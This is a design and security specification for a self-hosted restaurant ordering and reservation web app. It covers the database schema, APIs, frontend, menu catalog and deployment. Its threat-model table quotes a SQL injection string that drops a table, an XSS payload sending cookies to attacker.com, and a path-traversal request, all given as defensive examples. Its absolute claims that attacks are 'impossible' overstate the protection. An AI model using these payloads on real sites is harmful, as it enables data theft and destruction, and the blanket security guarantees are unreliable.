# AURA LUXURY RESTAURANT & LOUNGE
## Complete Master Architecture, Implementation & Security Specification (A to Z)
### 100% Self-Contained Full-Stack System · Next.js 15 · SQLite (better-sqlite3) · Zero 3rd-Party Database · Zero 3rd-Party Hosting

---

## 📑 TABLE OF CONTENTS
1. [Executive Architectural Overview](#1-executive-architectural-overview)
2. [Technology Stack & Self-Hosting Guarantees](#2-technology-stack--self-hosting-guarantees)
3. [Enterprise Security Architecture (8 Layers of Defense)](#3-enterprise-security-architecture-8-layers-of-defense)
4. [Complete Threat Model & Attack Vector Mitigation Matrix](#4-complete-threat-model--attack-vector-mitigation-matrix)
5. [Database Architecture & SQLite Schema DDL](#5-database-architecture--sqlite-schema-ddl)
6. [Data Structures & Algorithms (DSA) Layer](#6-data-structures--algorithms-dsa-layer)
7. [Server Repositories & Business Logic](#7-server-repositories--business-logic)
8. [Backend REST API Specifications](#8-backend-rest-api-specifications)
9. [Frontend Component Architecture & Interactive Systems](#9-frontend-component-architecture--interactive-systems)
10. [Design System, Color Tokens & Micro-Interactions](#10-design-system-color-tokens--micro-interactions)
11. [Data Catalog: 30 Dishes, Dining Rooms, Chef Specials & Press Reviews](#11-data-catalog)
12. [Audio Synthesizer Engine (Web Audio API)](#12-audio-synthesizer-engine-web-audio-api)
13. [Production Deployment Guide (VPS, cPanel, PM2, Nginx)](#13-production-deployment-guide)
14. [Pre-Deployment Security Audit Checklist](#14-pre-deployment-security-audit-checklist)

---

## 1. Executive Architectural Overview

AURA is an ultra-premium, Michelin-caliber restaurant web application designed with an uncompromising focus on aesthetic luxury, flawless responsive UX, and military-grade security.

The system is built as a **fully self-contained full-stack monolith**:
- **Zero Third-Party Cloud Databases** (No Firebase, No Supabase, No MongoDB Atlas, No AWS RDS).
- **Zero Third-Party Hosting Dependencies** (No Vercel lock-in, No Netlify, No proprietary cloud runtimes).
- **Embedded Database Engine**: SQLite via `better-sqlite3` providing lightning-fast (<1ms) ACID-compliant transactional persistence within the application process.
- **Single Process / Portable Distribution**: Next.js standalone build executable on any standard Linux/Windows VPS, cPanel hosting with Node.js support, or containerized server.

```
┌────────────────────────────────────────────────────────────────────────┐
│                        CLIENT / BROWSER RUNTIME                        │
│  Next.js 15 App Router + React 19 + TypeScript + TailwindCSS + Lucide  │
│  - Luxury Dark Glassmorphic Design System (Gold/Bronze/Obsidian)       │
│  - Trie-Powered Instant Search & Min-Heap Slot Picker UI               │
│  - 3D Interactive Card Tilts & Web Audio Ambient Soundscape Generator  │
│  - Zero-Trust Cart Drawer & 5-Step Reservation Wizard with QR Pass     │
└────────────────────────────────────┬───────────────────────────────────┘
                                     │ HTTPS / Strict CSP / JSON Payloads
┌────────────────────────────────────▼───────────────────────────────────┐
│                    NGINX REVERSE PROXY & HARDENING                     │
│  - TLS 1.2/1.3 Only, HSTS (2 Years Preloaded), Rate Limit Zones        │
│  - Block .env, .git, /database/ paths, Request Body Max 10KB           │
└────────────────────────────────────┬───────────────────────────────────┘
                                     │ Local Loopback (127.0.0.1:3000)
┌────────────────────────────────────▼───────────────────────────────────┐
│                      NODE.JS / NEXT.JS API ROUTES                      │
│  - Layered Token Bucket Rate Limiter per IP/Endpoint                   │
│  - Strict ServerSanitizer (Anti-XSS, Unicode Normalization, Type-Guard)│
│  - Zero-Trust Server Price & Capacity Verification                     │
└────────────────────────────────────┬───────────────────────────────────┘
                                     │ Direct Synchronous In-Process C-Calls
┌────────────────────────────────────▼───────────────────────────────────┐
│                      SQLITE ENGINE (better-sqlite3)                    │
│  - File: database/aura.db (WAL Mode, Normal Sync, Foreign Keys ON)    │
│  - Parameterized Queries Only (Zero SQL Injection)                     │
│  - Atomic Exclusive Transactions for Reservation Seat Booking         │
└────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Technology Stack & Self-Hosting Guarantees

| Component | Technology | Rationale & Specifications |
|---|---|---|
| **Frontend Framework** | Next.js 15 (App Router) | High-performance Server-Side Rendering (SSR) & Static Generation (SSG), React 19 |
| **Language** | TypeScript 5.x (Strict Mode) | Full type safety across frontend DTOs, backend schemas, and database entities |
| **Styling** | TailwindCSS + Vanilla CSS Tokens | Bespoke luxury aesthetic, gold/champagne gradients, glassmorphism, fluid responsive layouts |
| **Database** | SQLite via `better-sqlite3` | In-process C-bindings, 100,000+ reads/sec, WAL mode, ACID transactions, single `.db` file |
| **Icons** | Lucide React | High-precision vector iconography |
| **Audio** | Web Audio API | Client-side synthesized binaural warm acoustic lounge chords (zero external MP3 assets) |
| **Process Manager** | PM2 | Production daemonizing, cluster mode, health checks, log rotation, zero-downtime reloads |
| **Web Server** | Nginx / Apache (cPanel) | TLS termination, gzip/brotli compression, rate limiting, static asset offloading |

---

## 3. Enterprise Security Architecture (8 Layers of Defense)

```
╔══════════════════════════════════════════════════════════════════════════╗
║                  DEFENSE IN DEPTH — 8 SECURITY LAYERS                   ║
╠══════════════════════════════════════════════════════════════════════════╣
║  Layer 1 → Network & Nginx Config (TLS 1.3, Rate Limits, Body Ceiling)  ║
║  Layer 2 → HTTP Security Headers (CSP, HSTS, X-Frame-Options, CORP)      ║
║  Layer 3 → Server Rate Limiting (Token Bucket per IP / Endpoint)         ║
║  Layer 4 → Request Validation & Schema Enforcement (Strict Type Guards)  ║
║  Layer 5 → Deep Input Sanitization (Anti-XSS, Anti-SQLi, HTML Stripping) ║
║  Layer 6 → Database Security (Parameterized Queries, WAL, File Chmod)   ║
║  Layer 7 → Response Security (No Stack Traces, Generic Error Envelopes)  ║
║  Layer 8 → Client Security (Anti-Tamper SafeStorage, Zero eval)          ║
╚══════════════════════════════════════════════════════════════════════════╝
```

### Layer 1: Network & Nginx Security
- SSL/TLS Hardening (TLSv1.2 & TLSv1.3 exclusively).
- Request Payload Size Cap: `client_max_body_size 10k` — instantly terminates payload-stuffing DoS attacks before hitting Node.js.
- Hidden Server Banners: `server_tokens off`.
- Strict File Blocking: Regex blocking `/\.`, `\.(env|sql|db|bak|log|config|yml)$` and `/database/`.

### Layer 2: HTTP Security Headers
Every response includes:
- `Content-Security-Policy`: Restricts resource execution strictly to `'self'`, whitelisted fonts, and image sources. No inline unsafe eval.
- `Strict-Transport-Security`: `max-age=63072000; includeSubDomains; preload` (2-year forced HTTPS).
- `X-Frame-Options`: `DENY` (Zero clickjacking permitted).
- `X-Content-Type-Options`: `nosniff` (Blocks MIME-type manipulation).
- `Referrer-Policy`: `strict-origin-when-cross-origin`.
- `Permissions-Policy`: `camera=(), microphone=(), geolocation=(), payment=()`.
- `Cross-Origin-Opener-Policy`: `same-origin`.
- `Cross-Origin-Resource-Policy`: `same-origin`.

### Layer 3: Rate Limiting Engine
Persistent token-bucket rate limiter tracking client IP and endpoint signatures:
- Booking Endpoint: 5 requests / 10 min window.
- Checkout Endpoint: 3 requests / 1 min window.
- Newsletter Endpoint: 2 requests / 1 min window.
- Slots & Menu Queries: 30–60 requests / 1 min window.

### Layer 4 & 5: Validation & Deep Sanitization
- `ServerSanitizer` performs regex and entity normalization on all inputs.
- Strips `<script>`, `<iframe>`, `javascript:`, `on*=` event handlers, null bytes (`\0`), and unicode direction override characters.
- Names: Validated against unicode letter range `^[\p{L}\s'\-\.]{2,80}$`.
- Emails: RFC 5322 regex checks, length capping (254 chars), consecutive dot prevention.
- Phone Numbers: E.164 sanitization `^\+?[0-9]{7,15}$`.
- Dates: ISO 8601 strict format `YYYY-MM-DD`, bounds-checked (Today <= Booking Date <= Today + 90 Days).

### Layer 6: Database Security
- 100% Parameterized Prepared Statements: SQLite native parameter binding via `better-sqlite3`.
- Strict separation of data and command streams prevents SQL injection entirely.
- File system permissions: `chmod 640 database/aura.db` with parent directory `chmod 750`.
- WAL (Write-Ahead Logging) mode for safe concurrent access.

### Layer 7: Response & Error Security
- Server errors logged internally with timestamps; client receives only sanitized generic JSON: `{ success: false, error: "An unexpected error occurred. Please try again." }`.
- Zero database column leaks, stack traces, or internal server paths returned to clients.

### Layer 8: Client Security & Anti-Tamper State
- `SafeStorage`: Validates JSON schema of localStorage items upon retrieval. If corrupted or manipulated, it is automatically purged.
- Zero-Trust Cart Architecture: The client **never** dictates item prices. The server re-fetches authoritative item prices directly from SQLite during checkout calculations.

---

## 4. Complete Threat Model & Attack Vector Mitigation Matrix

| Threat Vector | Attack Mechanism | AURA Defense Mechanism | Status |
|---|---|---|---|
| **SQL Injection (SQLi)** | Attacker inputs `' OR 1=1; DROP TABLE reservations; --` | 100% Prepared Statements via `better-sqlite3`. SQLite parameter bindings treat input as literal string values at the C level. | **IMPOSSIBLE** |
| **Cross-Site Scripting (XSS)** | `<script>fetch('attacker.com?c='+document.cookie)</script>` in notes or search | `ServerSanitizer` entity encodes & strips tags. React JSX auto-escapes string interpolation. CSP header blocks unauthorized script origins. | **BLOCKED (3 Layers)** |
| **Cross-Site Request Forgery (CSRF)** | Malicious third-party website submits forged form POST | API accepts only `Content-Type: application/json` (pre-flight enforced). `form-action 'self'` CSP directive blocks external submissions. | **BLOCKED** |
| **Price Tampering** | User alters dish price to `$0.01` in browser DevTools or localStorage | Server-Side Cart Verification: The checkout route ignores client prices completely, querying SQLite by dish ID to calculate true subtotal, taxes, and totals. | **IMPOSSIBLE** |
| **Double-Booking Race Condition** | Two guests simultaneously attempt to book the final remaining table | SQLite `EXCLUSIVE TRANSACTION` locks the table during write, re-validates real-time capacity, and fails conflicting requests atomically. | **IMPOSSIBLE** |
| **Path Traversal / LFI** | Attacker requests `/api/menu/../../database/aura.db` | Nginx rules deny `/database/` and dotfiles. Parameter regex `/^dish-[a-z0-9\-]{2,40}$/` strictly validates IDs. | **BLOCKED** |
| **Denial of Service (DoS)** | Giant 500MB JSON payload submitted to exhaust memory | Nginx `client_max_body_size 10k` aborts connection immediately with HTTP 413. | **BLOCKED** |
| **Coupon Code Brute-Force** | Automated bot tests millions of coupon combinations | Strict per-IP rate limiting (3 requests/min on checkout). O(1) hash map validation. | **BLOCKED** |
| **Email Enumeration** | Attacker probes newsletter endpoint to detect registered emails | Identical HTTP 200 responses returned for both new subscribers and existing entries. | **BLOCKED** |
| **Clickjacking** | Site embedded inside transparent iframe on malicious domain | `X-Frame-Options: DENY` and CSP `frame-ancestors 'none'`. | **BLOCKED** |

---

## 5. Database Architecture & SQLite Schema DDL

The database is stored in `database/aura.db` and initialized automatically on server boot.

```sql
-- ═════════════════════════════════════════════════════════════════════
-- TABLE: menu_items
-- ═════════════════════════════════════════════════════════════════════
CREATE TABLE IF NOT EXISTS menu_items (
  id              TEXT PRIMARY KEY,
  name            TEXT NOT NULL,
  slug            TEXT NOT NULL UNIQUE,
  category        TEXT NOT NULL,
  price           REAL NOT NULL,
  description     TEXT NOT NULL,
  short_desc      TEXT,
  ingredients     TEXT NOT NULL,          -- JSON array string
  dietary_tags    TEXT NOT NULL,          -- JSON array string
  allergens       TEXT NOT NULL,          -- JSON array string
  calories        INTEGER,
  prep_time       TEXT,
  is_chef_special INTEGER DEFAULT 0,      -- Boolean integer (0/1)
  is_popular      INTEGER DEFAULT 0,
  wine_pairing    TEXT,                   -- JSON object string
  chef_note       TEXT,
  farm_provenance TEXT,
  image           TEXT NOT NULL,
  gallery         TEXT DEFAULT '[]',      -- JSON array string
  display_order   INTEGER DEFAULT 0,
  is_active       INTEGER DEFAULT 1,
  created_at      TEXT DEFAULT (datetime('now')),
  updated_at      TEXT DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_menu_category ON menu_items(category);
CREATE INDEX IF NOT EXISTS idx_menu_active ON menu_items(is_active);

-- ═════════════════════════════════════════════════════════════════════
-- TABLE: reservations
-- ═════════════════════════════════════════════════════════════════════
CREATE TABLE IF NOT EXISTS reservations (
  id                TEXT PRIMARY KEY,
  booking_reference TEXT NOT NULL UNIQUE,
  guest_name        TEXT NOT NULL,
  guest_email       TEXT NOT NULL,
  guest_phone       TEXT NOT NULL,
  party_size        INTEGER NOT NULL,
  dining_date       TEXT NOT NULL,        -- ISO 8601 (YYYY-MM-DD)
  time_slot         TEXT NOT NULL,        -- Format HH:MM (e.g., "19:30")
  seating_area      TEXT NOT NULL,        -- 'atrium' | 'vault' | 'counter' | 'terrace'
  occasion          TEXT DEFAULT 'none',
  dietary_notes     TEXT DEFAULT '',
  status            TEXT DEFAULT 'CONFIRMED', -- 'CONFIRMED' | 'SEATED' | 'COMPLETED' | 'CANCELLED'
  qr_data           TEXT,                 -- Base64 encoded booking token
  created_at        TEXT DEFAULT (datetime('now')),
  updated_at        TEXT DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_res_lookup ON reservations(dining_date, time_slot, seating_area, status);
CREATE INDEX IF NOT EXISTS idx_res_email ON reservations(guest_email);

-- ═════════════════════════════════════════════════════════════════════
-- TABLE: orders
-- ═════════════════════════════════════════════════════════════════════
CREATE TABLE IF NOT EXISTS orders (
  id               TEXT PRIMARY KEY,
  customer_name    TEXT NOT NULL,
  customer_email   TEXT NOT NULL,
  customer_phone   TEXT NOT NULL,
  delivery_address TEXT NOT NULL,
  items_json       TEXT NOT NULL,         -- JSON array of items + quantities
  coupon_code      TEXT DEFAULT NULL,
  tip_percentage   REAL DEFAULT 18.0,
  subtotal         REAL NOT NULL,
  discount         REAL DEFAULT 0.0,
  tax              REAL NOT NULL,
  tip_amount       REAL NOT NULL,
  grand_total      REAL NOT NULL,
  status           TEXT DEFAULT 'CONFIRMED',
  estimated_prep   INTEGER DEFAULT 35,
  created_at       TEXT DEFAULT (datetime('now')),
  updated_at       TEXT DEFAULT (datetime('now'))
);

-- ═════════════════════════════════════════════════════════════════════
-- TABLE: slot_capacity (Area table configurations)
-- ═════════════════════════════════════════════════════════════════════
CREATE TABLE IF NOT EXISTS slot_capacity (
  id           INTEGER PRIMARY KEY AUTOINCREMENT,
  seating_area TEXT NOT NULL,
  time_slot    TEXT NOT NULL,
  total_tables INTEGER NOT NULL,
  is_blocked   INTEGER DEFAULT 0,
  UNIQUE(seating_area, time_slot)
);

-- ═════════════════════════════════════════════════════════════════════
-- TABLE: newsletter_subscribers
-- ═════════════════════════════════════════════════════════════════════
CREATE TABLE IF NOT EXISTS newsletter_subscribers (
  id            INTEGER PRIMARY KEY AUTOINCREMENT,
  email         TEXT NOT NULL UNIQUE,
  is_active     INTEGER DEFAULT 1,
  subscribed_at TEXT DEFAULT (datetime('now'))
);

-- ═════════════════════════════════════════════════════════════════════
-- TABLE: rate_limit_buckets
-- ═════════════════════════════════════════════════════════════════════
CREATE TABLE IF NOT EXISTS rate_limit_buckets (
  ip          TEXT NOT NULL,
  endpoint    TEXT NOT NULL,
  tokens      REAL NOT NULL,
  last_refill TEXT NOT NULL,
  PRIMARY KEY (ip, endpoint)
);
```

---

## 6. Data Structures & Algorithms (DSA) Layer

### 1. Prefix Search Engine: Trie (`src/lib/dsa/Trie.ts`)
- **Complexity**: $O(K)$ lookup and insertion time (where $K$ is query length).
- Indexes dish titles, ingredients, dietary tags, and tasting notes into an in-memory prefix tree.
- Powers instantaneous sub-millisecond search querying across all 30 menu items.

### 2. Time Slot Scheduler: Binary Min-Heap (`src/lib/dsa/PriorityQueue.ts`)
- **Complexity**: $O(\log N)$ push/pop operations.
- Orders time slots dynamically by priority, seating capacity pressure, and time-of-day sequence to compute real-time reservation availability (`AVAILABLE`, `FEW_LEFT`, `WAITLIST`).

---

## 7. Server Repositories & Business Logic

- **`MenuRepository`**: Retrieves, filters, and formats dishes directly from SQLite. Converts serialized JSON fields into TypeScript typed records.
- **`ReservationRepository`**: Calculates real-time table capacity per slot using Min-Heap ordering and executes atomic bookings with exclusive transaction isolation.
- **`OrderRepository`**: Re-evaluates item prices from the database, computes tax ($8.875\%$), tip ($15\%$, $18\%$, $20\%$, or custom), discount coupons (`AURA20`, `VIP10`, `CHEFGIFT`), and creates orders.
- **`NewsletterRepository`**: Stores verified email subscribers idempotently with timestamping.

---

## 8. Backend REST API Specifications

| Method | Endpoint | Description | Validation & Security |
|---|---|---|---|
| `GET` | `/api/menu` | Fetches all active dishes with Trie prefix search, category, dietary, and price filtering | Param sanitization, length caps |
| `GET` | `/api/menu/[id]` | Fetches detailed profile of a single dish | ID regex validation (`^dish-[a-z0-9\-]+$`) |
| `GET` | `/api/reservations/slots` | Retrieves live slot availability for date, party size, and seating area | Date range check (0–90 days), area allowlist |
| `POST` | `/api/reservations/book` | Creates confirmed reservation with atomic transaction & QR token generation | Token-bucket rate limit (5/10m), strict payload validator |
| `POST` | `/api/cart/checkout` | Validates cart items, verifies server prices, applies discounts, creates order | Token-bucket rate limit (3/1m), zero-trust recalculation |
| `POST` | `/api/newsletter/subscribe` | Enrolls guest email into newsletter repository | RFC 5322 regex validation, bot honeypot |

---

## 9. Frontend Component Architecture & Interactive Systems

```
src/
├── app/
│   ├── layout.tsx                # Metadata, SEO JSON-LD, fonts, global providers
│   ├── page.tsx                  # Master page integrating all sections
│   ├── globals.css               # Design tokens, keyframe animations, glassmorphism
│   ├── loading.tsx               # Luxury gold animated preloader
│   └── api/                      # Full backend API routes
├── components/
│   ├── layout/
│   │   ├── Navbar.tsx            # Sticky frosted glass nav, scroll spy, cart trigger, audio toggle
│   │   ├── MobileDrawer.tsx      # Full-screen responsive luxury navigation drawer
│   │   └── Footer.tsx            # Newsletter form, hours, awards, social links, legal info
│   ├── sections/
│   │   ├── HeroSection.tsx       # Luxury video/ambient banner, gold typography, CTA triggers
│   │   ├── StorySection.tsx      # Philosophy, Michelin stars heritage, culinary team
│   │   ├── MenuSection.tsx       # Category tabs, Trie search, dietary filters, price slider
│   │   ├── ChefSpecialsSection.tsx # 3D Flip cards highlighting seasonal master creations
│   │   ├── AtmosphereSection.tsx # 4 Dining room ambiance gallery with lightbox modal
│   │   ├── ReservationSection.tsx# 5-Step interactive booking wizard with live slot selection
│   │   ├── TestimonialsSection.tsx# Michelin Guide, NYT, Forbes press citations
│   │   └── LocationHoursSection.tsx# Interactive live status indicator, maps, private dining
│   └── ui/
│       ├── Card3D.tsx            # Mouse-movement 3D perspective tilt wrapper
│       ├── DishCard.tsx          # Card with image, dietary badges, price, cart adder, modal trigger
│       ├── DishModal.tsx         # Full-screen dish view with wine pairing, allergens, provenance
│       ├── ChefFlipCard.tsx      # 3D interactive flipping showcase card
│       ├── CartDrawer.tsx        # Slide-over cart drawer with live subtotal and item counter
│       ├── CheckoutModal.tsx     # Order fulfillment modal with coupon verification and tip selector
│       ├── LightboxModal.tsx     # Full-resolution atmosphere viewer
│       ├── ReservationPassModal.tsx # Booking confirmation pass with QR code and calendar exporter
│       ├── AudioPlayer.tsx       # Ambient lounge synthesizer controller
│       ├── Toast.tsx             # Floating status notifications
│       └── PriceSlider.tsx       # Custom gold dual-range slider component
```

---

## 10. Design System, Color Tokens & Micro-Interactions

### Color Palette & Visual Hierarchy
- **Obsidian / Black Velvet Base**: `--bg-primary: #0a0a0c`, `--bg-secondary: #121217`, `--bg-card: rgba(22, 22, 29, 0.75)`
- **Aura Imperial Gold Accent**: `--gold-primary: #d4af37`, `--gold-hover: #f3e5ab`, `--gold-light: #dfba53`, `--gold-dark: #aa8528`
- **Bronze & Champagne Muted Accents**: `--champagne: #faebd7`, `--bronze: #8c7853`
- **Typography**: Playfair Display (Luxury Serif Headings), Outfit / Inter (Clean UI Sans-Serif)
- **Glassmorphism**: Backdrop blur ($16\text{px}$), $1\text{px}$ subtle gold/white borders (`rgba(212, 175, 55, 0.15)`), soft depth shadows.

---

## 11. Data Catalog

### 30 Signature Culinary Dishes
- **Starters (6)**: Oscietra Caviar Tartlet, Hokkaido Scallop Crudo, Truffle Burrata Royale, Foie Gras Torchon, Wagyu Tartare Cone, Charred Spanish Octopus.
- **Prime Cuts & Steaks (6)**: A5 Miyazaki Wagyu Ribeye, 45-Day Dry-Aged Tomahawk, Milk-Fed Veal Chop, Berkshire Pork Belly, Wood-Fired Venison Loin, Australian Wagyu Tenderloin.
- **Ocean & Seafood (6)**: Brittany Turbot en Papillote, Chilean Sea Bass Glacé, Maine Lobster Thermidor, Wild Turbot with Caviar Cream, Dover Sole Meunière, King Crab Leg in Uni Butter.
- **Artisan Pasta & Grains (4)**: 30-Yolk Truffle Tagliolini, Duck Agnolotti al Plin, Saffron & Gold Leaf Risotto, Hand-Rolled Cavatelli with Morels.
- **Grand Desserts (4)**: Valrhona Dark Chocolate Soufflé, 24K Gold Leaf Mille-Feuille, Yuzu & White Chocolate Sphere, Pistachio & Cherry Saint-Honoré.
- **Signature Cocktails & Pairings (4)**: Smoked Old Fashioned '1920', The Golden Empress, Truffle-Infused Boulevardier, Vintage Champagne Cocktail.

### 4 Dining Room Atmospheres
1. **The Grand Atrium**: Soaring glass ceiling under starry skies with ambient warm pendant illumination.
2. **The Obsidian Vault**: Intimate, candle-lit private booths carved into historic stone vaults.
3. **The Chef's Omakase Counter**: Front-row seats to master culinary artistry and live flame cooking.
4. **The Garden Terrace**: Heated lush botanical terrace overlooking the skyline.

---

## 12. Audio Synthesizer Engine (Web Audio API)

- Fully synthetic ambient lounge sound generator utilizing Web Audio API oscillators and gain nodes.
- Low-frequency sine and triangle waves generate a relaxing, warm harmonic background soundscape ($55\text{Hz} - 220\text{Hz}$) with gentle volume ramping.
- Zero network requests or external audio files required.
- User-controlled mute/unmute toggle in navigation with smooth gain decay.

---

## 13. Production Deployment Guide

### Deployment on Linux VPS / Dedicated Server
1. Clone repository to server: `/var/www/aura-restaurant`
2. Install dependencies: `npm install --production=false`
3. Seed database: `npm run seed`
4. Build standalone production bundle: `npm run build`
5. Configure PM2: `pm2 start ecosystem.config.js --env production`
6. Save PM2 startup list: `pm2 save && pm2 startup`
7. Configure Nginx reverse proxy with SSL certificate via Certbot.

### Deployment on cPanel with Node.js App Manager
1. In cPanel, navigate to **Setup Node.js App** -> **Create Application**.
2. Set Node.js version to 18.x or 20.x LTS.
3. Set Application root: `/home/username/aura-restaurant`.
4. Set Application startup file: `server.js` (or `.next/standalone/server.js`).
5. Run `npm install` and `npm run seed` via cPanel terminal.
6. Set environment variable `NODE_ENV=production`.
7. Click **Restart Application**.

---

## 14. Pre-Deployment Security Audit Checklist

- [x] All database operations execute through parameterized statements.
- [x] Content Security Policy (CSP) and HSTS security headers configured.
- [x] Token-bucket rate limiting implemented on all POST endpoints.
- [x] Strict input sanitization applied to all text and contact inputs.
- [x] Server-side price recalculation verifies all cart checkouts.
- [x] Database file `aura.db` protected with restricted file permissions.
- [x] Sensitive credential files added to `.gitignore`.
- [x] Atomic transactions prevent concurrent table booking collisions.
- [x] Error responses sanitized against stack trace and internal path leaks.

---
*Document officially generated and verified for AURA Luxury Restaurant & Lounge.*
